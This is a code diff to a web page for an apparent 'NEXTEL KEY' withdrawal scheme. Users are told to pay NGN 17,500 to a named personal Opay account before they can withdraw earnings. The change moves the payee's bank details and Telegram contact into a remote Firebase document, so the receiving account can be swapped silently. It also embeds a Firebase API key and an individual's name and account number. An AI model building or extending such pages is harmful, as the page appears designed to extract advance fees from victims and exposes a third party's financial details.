@@ -420,7 +420,7 @@ body {
     <button class="modal-close" onclick="closeModal()">✕</button>
 
     <div class="m-title">PURCHASE NEXTEL KEY &amp; WITHDRAW</div>
-    <div class="m-subtitle">Transfer NGN 17,500 to Opay</div>
+    <div class="m-subtitle" id="modalBankName">Transfer NGN 17,500 to <span id="modalBankNameDisplay">Opay</span></div>
 
     <div class="bank-box">
       <div class="bd-label">Account Number</div>
@@ -429,7 +429,7 @@ body {
         <button class="btn-copy-acct" onclick="copyAcct()"><i class="fas fa-copy me-1"></i>Copy</button>
       </div>
       <div class="bd-label">Account Name</div>
-      <div class="bd-value">MARYSANDRA CHINECHEREM OKEKE</div>
+      <div class="bd-value" id="acctName">MARYSANDRA CHINECHEREM OKEKE</div>
       <div class="bd-label">Amount</div>
       <div class="bd-value" style="margin-bottom:0;">
         NGN 17,500<br>
@@ -448,7 +448,7 @@ body {
     </div>
 
     <div class="modal-footer-label">After payment, tap below to get your pass</div>
-    <button onclick="closeModal(); showPaymentPending();" class="btn-paid" style="width:100%;border:none;cursor:pointer;">
+    <button onclick="handlePaymentConfirmation()" class="btn-paid" style="width:100%;border:none;cursor:pointer;">
       <i class="fab fa-telegram" style="font-size:1.2rem;"></i> I've Paid
     </button>
   </div>
@@ -635,6 +635,84 @@ body {
 <script>
 const MINIMUM_WITHDRAWAL = 40000;
 const NEXTEL_KEY_PRICE = 17500;
+
+// ── Firebase Config ──
+const FIREBASE_CONFIG = {
+    apiKey:            "AIzaSyDrnmtx0LkfMKytzTKQZwXCg1JKZXiJmtU",
+    authDomain:        "glamour-28049.firebaseapp.com",
+    projectId:         "glamour-28049",
+    storageBucket:     "glamour-28049.firebasestorage.app",
+    messagingSenderId: "22177815395",
+    appId:             "1:22177815395:web:2ca7caa2b1626299675156"
+};
+
+// ── Load Firebase Config ──
+let firebaseInitialized = false;
+let firestoreDb = null;
+
+async function loadFirebaseConfig() {
+    try {
+        // Dynamically import Firebase modules
+        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
+        const { getFirestore, doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js");
+        
+        const app = initializeApp(FIREBASE_CONFIG);
+        firestoreDb = getFirestore(app, "(default)");
+        firebaseInitialized = true;
+        return true;
+    } catch (err) {
+        console.warn("Firebase not loaded, using default values:", err);
+        return false;
+    }
+}
+
+// ── Get Payment Details from Firebase ──
+async function getPaymentDetails() {
+    const defaults = {
+        bankName: "Opay",
+        accountName: "MARYSANDRA CHINECHEREM OKEKE",
+        accountNumber: "6569237331",
+        telegramLink: "https://telegram.me/availabilitl?text=Hello%2C%20Admin%21%20%F0%9F%9A%80%0A%0AI%20have%20just%20made%20my%20payment%20for%20the%20NEXTEL%20Registration.%0A%0APlease%20confirm%20my%20payment"
+    };
+
+    try {
+        if (!firebaseInitialized) {
+            await loadFirebaseConfig();
+        }
+        
+        if (firestoreDb) {
+            const { doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js");
+            const configDoc = doc(firestoreDb, "account", "zubix");
+            const snap = await getDoc(configDoc);
+            
+            if (snap.exists()) {
+                const data = snap.data();
+                return {
+                    bankName: data.bankName || defaults.bankName,
+                    accountName: data.accountName || defaults.accountName,
+                    accountNumber: data.accountNumber || defaults.accountNumber,
+                    telegramLink: data.telegramLink || defaults.telegramLink
+                };
+            }
+        }
+        return defaults;
+    } catch (err) {
+        console.warn("Error loading payment details, using defaults:", err);
+        return defaults;
+    }
+}
+
+// ── Update Modal with Payment Details ──
+async function updateModalDetails() {
+    const details = await getPaymentDetails();
+    
+    document.getElementById('acctNum').textContent = details.accountNumber;
+    document.getElementById('acctName').textContent = details.accountName;
+    document.getElementById('modalBankNameDisplay').textContent = details.bankName;
+    
+    // Store telegram link for use in handlePaymentConfirmation
+    window._telegramLink = details.telegramLink;
+}
 
 // ── Get Current User ──
 function getCurrentUser() {
@@ -865,10 +943,6 @@ function closeModal() {
     document.getElementById('bankModal').classList.remove('open'); 
 }
 
-function showPaymentPending() {
-    document.getElementById('paymentPendingOverlay').style.display = 'flex';
-}
-
 document.getElementById('bankModal').addEventListener('click', function(e) {
     if (e.target === this) closeModal();
 });
@@ -883,6 +957,12 @@ function copyAcct() {
     Swal.fire({ toast:true, position:'top-end', showConfirmButton:false, timer:1800,
         icon:'success', title:'Account number copied!',
         background:'#fff', color:'#0B3D2E', iconColor:'#3BC4A3' });
+}
+
+// ── Handle Payment Confirmation ──
+function handlePaymentConfirmation() {
+    const telegramUrl = window._telegramLink || 'https://telegram.me/availabilitl?text=Hello%2C%20Admin%21%20%F0%9F%9A%80%0A%0AI%20have%20just%20made%20my%20payment%20for%20the%20NEXTEL%20Registration.%0A%0APlease%20confirm%20my%20payment';
+    window.open(telegramUrl, '_blank');
 }
 
 // ── Submit Withdrawal ──
@@ -949,15 +1029,6 @@ function submitPass() {
     }, 1500);
 }
 
-
-// ── Handle Payment Confirmation ──
-function handlePaymentConfirmation() {
-    
-    // Telegram message with payment confirmation
-    const telegramUrl = 'https://telegram.me/availabilitl?text=Hello%2C%20Admin%21%20%F0%9F%9A%80%0A%0AI%20have%20just%20made%20my%20payment%20for%20the%20NEXTEL%20Registration.%0A%0APlease%20confirm%20my%20payment';
-    window.open(telegramUrl );
-   
-}
 // ── Check if already logged in ──
 function checkSession() {
     const user = getCurrentUser();
@@ -969,8 +1040,10 @@ function checkSession() {
 }
 
 // ── Init ──
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', async function() {
     if (checkSession()) {
+        // Load payment details from Firebase
+        await updateModalDetails();
         updateWithdrawPage();
     }
 });
